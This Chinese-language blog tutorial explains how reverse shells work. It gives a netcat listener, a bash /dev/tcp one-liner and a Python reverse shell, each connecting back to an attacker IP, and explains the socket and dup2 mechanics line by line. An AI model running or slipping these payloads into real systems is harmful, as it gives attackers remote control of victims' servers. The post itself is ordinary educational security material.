---
layout: single
author_profile: true
comments: true
title: reverse shell原理
tagline: Python实例分析
category : Linux
tags : [Linux, Python]
---

# RevSh简介
当你需要远程控制一台服务器时，这个服务器有防火墙保护着，阻止外来的TCP连接，这时就需要Reverse Shell技术，reverse shell技术如其名，也叫逆向shell，反弹shell，也在就是说在服务器端发起TCP连接，当连接建立成功后，你就获得服务器的一个shell，可以操纵远程服务器。  
从上述过程可以看出，如何能让远程服务器执行一些代码，我们就可以控制它，进入正题，如果服务器存在缓冲区溢出、代码注入等漏洞，攻击者可以很容易的黑掉服务器。  

# RevSh实例
Attacker: 192.168.0.1  
Victim: 192.168.0.2  

### Attacker
使用nc在端口1234建立一个服务器端，监听TCP连接请求;  

```
nc -l -p 1234
```

### Victim
在终端执行如下命令  

```
bash -i >& /dev/tcp/192.168.0.1/1234 0>&1  
```

### 结果
Attacker成功获得一个Victim的shell.  

# RevSh原理
bash不是很熟悉，看一个Python版本的reverse shell:  

{% highlight bash %}
Python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'     
{% endhighlight %}

Python代码展开如下：

{% highlight python %}
    import socket,subprocess,os  
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
    s.connect(("192.168.0.1",1234))  
    os.dup2(s.fileno(),0)  
    os.dup2(s.fileno(),1)  
    os.dup2(s.fileno(),2)  
    p=subprocess.call(["/bin/sh","-i"])  
{% endhighlight %}

os.dup2三条语句通过覆盖原来的stdin, stdout, stderr，将套接字s和stdin, stdout,  stderr关联起来，这样可以从套接字读取输入，并将输出和错误写入套接字;
subprocess创建一个子进程来执行 /bin/sh -i, -i 选项的作用是“使脚本以交互的方式执行”， bash版本的 -i选项不是必须的，而python版本创建了一个子进程，必须使用-i选项.  


### 参考

reverse shell cheat
